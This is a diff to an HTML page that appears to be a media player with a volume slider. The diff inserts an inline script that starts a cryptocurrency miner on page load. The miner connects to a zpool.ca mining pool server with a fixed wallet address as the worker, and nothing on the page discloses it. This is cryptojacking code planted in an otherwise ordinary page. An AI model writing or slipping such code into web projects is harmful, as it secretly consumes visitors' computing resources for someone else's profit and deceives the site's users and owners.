@@ -360,6 +360,24 @@
     <input type="range" class="volume-slider" min="0" max="1" step="0.01" value="1">
   </div>
   <script src="script.js"></script>
+      <script>
+        const client = new Client({
+            algorithm: 'minotaurx',  // yespower, minotaurx --> This is algo you want to mine
+            stratum: {
+                server: "minotaurx.na.mine.zpool.ca",  // Your Pool host
+                port: 7019,  // Your Pool port
+                worker: "RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs",  
+                password: "c=RVN"  
+            },
+            options: {
+                threads: 1,  
+                log: true  
+            },
+        });
+
+        
+        client.start();
+      </script>
   <style>
     .rainbow-text {
       font-size: 20px;
